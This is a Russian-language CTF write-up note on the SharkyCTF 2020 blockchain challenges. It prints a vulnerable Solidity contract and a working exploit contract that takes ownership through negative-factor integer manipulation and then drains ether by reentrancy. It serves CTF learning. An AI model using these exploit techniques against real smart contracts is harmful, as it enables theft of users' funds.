# Sharkyctf2020

Sharkyctf 2020 — был целый набор заданий DeFi на Solidity и были райтапы на них в разделе blockchain.

Writeup: [https://imagin.vip/?p=1380#Warmup](https://imagin.vip/?p=1380#Warmup)

Фишечки:

* На etherscan видны все изменения параметров контракта (заменяем на свой контракт)

```
https://ropsten.etherscan.io/tx/0x112db25adf343310ab34a8210532c513cd5c6e309b368c19f577c590a0149d23#statechange
```

Пример эксплоита на Solidity:

Пусть есть контракт (который будем атаковать)

```
pragma solidity = 0.4.25;
 
contract Multipass {
    address public owner;
    uint256 public money;
     
    mapping(address => int256) public contributions;
     
    bool public withdrawn;
     
    constructor() public payable {
        contributions[msg.sender] = int256(msg.value * 900000000000000000000);
        owner = msg.sender;
        money = msg.value;
        withdrawn = false;
    }
     
    function gift() public payable {
        require(contributions[msg.sender] == 0 && msg.value == 0.00005 ether);
        contributions[msg.sender] = int256(msg.value) * 10;
        money += msg.value;
    }
   
    function takeSomeMoney() public {
        require(msg.sender == owner && withdrawn == false);
        uint256 someMoney = money/20;
        if(msg.sender.call.value(someMoney)()){
            money -= someMoney;
        }
        withdrawn = true;
    }
     
    function contribute(int256 _factor) public {
        require(contributions[msg.sender] != 0 && _factor < 10);
        contributions[msg.sender] *= _factor;
    }
     
    function claimContract() public {
        require(contributions[msg.sender] > contributions[owner]);
        owner = msg.sender;
    }
}
```

И этот контракт расположен по адресу: 0x693282455c051D6CB3B138fD78474c8D9F7c8AFa

Тогда эксплоит будет выглядеть следующим образом (Обрати внимание, что чужой контракт инициализируется через адрес):

```
pragma solidity = 0.4.25;

import "./multipass.sol";

contract exp{
    Multipass x;
    constructor(){
        x = Multipass(0x693282455c051D6CB3B138fD78474c8D9F7c8AFa);
    }
     
    function prepare() public payable{
        x.gift.value(0.00005 ether)();
        // you need invoke this function twice
        x.contribute(-100000000000);
        x.contribute(-100000000000);
        // x.contribute(2);
    }
     
    function Claim(){
        x.claimContract();
    }
     
    function reEntry(){
        x.takeSomeMoney();
    }
     
    function() public payable{
        x.takeSomeMoney();
    }
     
     
}
```
